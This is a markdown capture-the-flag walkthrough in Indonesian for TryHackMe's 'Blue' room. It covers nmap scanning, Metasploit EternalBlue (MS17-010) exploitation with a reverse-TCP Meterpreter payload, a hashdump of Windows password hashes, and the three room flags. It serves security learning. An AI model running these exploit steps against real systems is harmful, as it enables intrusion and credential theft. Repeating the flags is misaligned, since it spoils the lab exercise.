markdown

# TryHackMe: Blue - Writeup & Walkthrough

Repo ini berisi dokumentasi langkah-langkah penyelesaian room [Blue](https://tryhackme.com) di TryHackMe. Room ini berfokus pada eksploitasi kerentanan **MS17-010 (EternalBlue)** pada mesin Windows 7.

## 1. Reconnaissance (Recon)
Langkah awal dilakukan dengan memindai target menggunakan `nmap` untuk mencari port yang terbuka dan layanan yang berjalan.

```bash
nmap -sV -vv -Pn <TARGET_IP>

Gunakan kode dengan hati-hati.
Ditemukan port 445 (SMB) terbuka. Selanjutnya, dilakukan pengecekan apakah target rentan terhadap exploit EternalBlue:
bash

nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>

Gunakan kode dengan hati-hati.
Hasil: Host terkonfirmasi VULNERABLE terhadap CVE-2017-0143.
2. Gain Access (Exploitation)
Menggunakan Metasploit Framework untuk mendapatkan akses awal.

    Jalankan Metasploit: msfconsole
    Cari modul: search ms17-010
    Gunakan modul: use exploit/windows/smb/ms17_010_eternalblue
    Konfigurasi:
        set RHOSTS <TARGET_IP>
        set LHOST <YOUR_VPN_IP>
        set payload windows/x64/meterpreter/reverse_tcp
    Eksekusi: exploit

Hasil: Mendapatkan shell Meterpreter dengan hak akses NT AUTHORITY\SYSTEM.
3. Post-Exploitation & Flag Discovery
Setelah mendapatkan akses sistem, langkah selanjutnya adalah melakukan enumerasi lanjutan untuk menemukan flag yang tersembunyi sebagai bukti keberhasilan eksploitasi (Proof of Concept).
Langkah-langkah:

    Verifikasi Hak Akses: Memastikan sesi berjalan dengan privilese tinggi (SYSTEM).
    Pencarian File Flag: Mencari file teks di lokasi umum seperti direktori root, folder dokumen pengguna, dan folder konfigurasi sistem.
    Pengambilan Hash (Opsional): Dalam konteks simulasi, pengujian keamanan sering kali melibatkan pengambilan hash kata sandi untuk mendemonstrasikan kerentanan kredensial yang lemah.
```
Lokasi Flag yang Ditemukan:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter > search -f flag1.txt
```
Found 1 result...
=================

```
Path          Size (bytes)  Modified (UTC)
----          ------------  --------------
c:\flag1.txt  24            2019-03-18 03:27:21 +0800

meterpreter > 
meterpreter > cat "c:\\flag1.txt"
flag{access_the_machine}meterpreter > search -f flag2.txt
```
Found 1 result...
=================

```
Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Windows\System32\config\flag2.txt  34            2019-03-18 03:32:48 +0800

meterpreter > cat "c:\\Windows\\System32\\config\\flag2.txt"
flag{sam_database_elevated_access}meterpreter > search -f flag3.txt
```

Found 1 result...
=================
```
Path                              Size (bytes)  Modified (UTC)
----                              ------------  --------------
c:\Users\Jon\Documents\flag3.txt  37            2019-03-18 03:26:36 +0800

meterpreter > cat "c:\\Users\\Jon\\Documents\\flag3.txt"
flag{admin_documents_can_be_valuable}meterpreter > Interrupt: use the 'exit' command to quit
```
```
    Flag 1: flag{access_the_machine}
    Flag 2: flag{sam_database_elevated_access}
    Flag 3: flag{admin_documents_can_be_valuable}
```

<img width="768" height="453" alt="image" src="https://github.com/user-attachments/assets/1ae1fdf2-f255-46ac-8893-4736cde1ea09" />
<img width="767" height="633" alt="image" src="https://github.com/user-attachments/assets/145e5135-0929-4b8b-ad29-a065384d3ed6" />
<img width="763" height="580" alt="image" src="https://github.com/user-attachments/assets/52091643-d71f-4822-8c36-e1ef02093a96" />
<img width="774" height="322" alt="image" src="https://github.com/user-attachments/assets/19d76903-f9ec-4ab1-8b46-0604f682c068" />
<img width="768" height="594" alt="image" src="https://github.com/user-attachments/assets/1125230f-c071-4152-9eef-23a812453370" />
